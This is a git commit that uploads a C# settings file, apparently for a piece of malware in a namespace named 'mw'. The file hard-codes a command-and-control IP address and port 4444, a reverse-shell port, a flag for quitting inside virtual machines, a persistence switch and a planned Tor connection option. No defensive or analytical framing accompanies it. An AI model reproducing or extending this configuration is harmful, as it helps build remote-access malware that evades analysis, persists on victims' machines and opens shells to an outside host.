b1f3131f0d406fd586bb59775a46d8102f76d29a
pysl <34405876+pysl@users.noreply.github.com>
2022-05-31 20:59:46 -0400

    Add files via upload

---
+++ settings.cs
@@ -0,0 +1,10 @@
+namespace mw.settings {
+    class Settings {
+        public static string ip = "99.70.90.188";
+        public static int port = 4444;
+        public static int revsh_port = 3000;
+        public static bool quit_on_vm = false;
+        public static bool persistant = true;
+        public static bool connect_over_tor = false; //not implemented yet
+    }
+}
